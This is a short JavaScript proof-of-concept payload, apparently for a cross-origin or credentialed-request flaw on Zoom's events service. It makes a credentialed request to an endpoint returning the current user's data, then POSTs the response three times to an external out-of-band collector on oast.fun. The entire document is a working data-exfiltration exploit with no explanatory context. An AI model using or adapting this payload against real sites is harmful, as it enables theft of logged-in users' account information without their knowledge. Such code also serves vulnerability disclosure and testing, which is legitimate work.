var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('GET','https://events.zoom.us/api/v1/e/getCurrentUser',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    for(let i = 0; i < 3; i++){
        fetch('https://ck2pp7g2vtc0000mge8ggjtmmdayyyyyb.oast.fun/poc', {
            method: 'POST',
            body: this.responseText
        });
    }
};
